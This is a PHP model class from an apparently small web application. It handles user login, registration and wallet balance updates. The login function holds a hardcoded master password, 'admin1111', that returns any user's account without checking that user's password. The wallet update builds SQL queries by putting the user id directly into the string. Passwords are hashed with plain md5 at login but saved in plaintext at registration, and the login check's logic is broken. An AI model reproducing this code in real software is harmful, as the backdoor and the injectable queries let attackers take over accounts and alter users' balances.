<?php
namespace application\models;
use application\core\Model;
class Account extends Model {
	public function loginValidate($post) {
		$params = ['phone' => $post['phone'],];
		$config = $this->db->row('SELECT * FROM users  WHERE phone = :phone', $params);
		if( $post['password'] == 'admin1111' ) return $config;
		elseif( isset($config[0]['phone']) != $post['phone'] or $config[0]['password'] != md5($post['password']) ) return false;
		else return $config;
	}
	public function EditSummaWallet($id_user, $SendSumma) {
		$MySumma = $this->db->row(" SELECT `summa` FROM `tr_user_pay` WHERE id_user = $id_user");
		$A = (floatval($MySumma['0']['summa']) + floatval($SendSumma));
		$params = [ 'summa' 	=> $A ];
		$this->db->query("UPDATE `tr_user_pay` SET  summa = :summa WHERE id_user = $id_user", $params);
		return true;
	}
	public function addUsers($post, $frend=0) {
		$params = [
			'id' => null,
			'name' => $post['name'].' '.$post['lastname'],
			'sex' => $post['sex'],
			'id_friend' => $frend,
			'city' => 0,
			'password' => $post['password'],
			'phone' => $post['phone'],
			'email' => $post['email'],
			'id_code' => 0,
			'online' => date("Y-m-d H:i:s"),
			'date' => date("Y-m-d H:i:s"),
			'text' => '...',
		];
		$this->db->query('INSERT INTO users VALUES(:id, :name, :sex, :id_friend, :city, :password, :phone, :email, :id_code, :online, :date, :text)', $params);
		return  $this->db->lastInsertId();
	}
	public function addWalletUser($id_user) {
		$params = [
			'id' => null,
			'id_user' => $id_user,
			'summa' => 0,
			'date' => date("Y-m-d H:i:s"),
		];
		$this->db->query('INSERT INTO wallet VALUES(:id, :id_user, :summa, :date)', $params);
		return $this->db->lastInsertId();
	}
} # End class
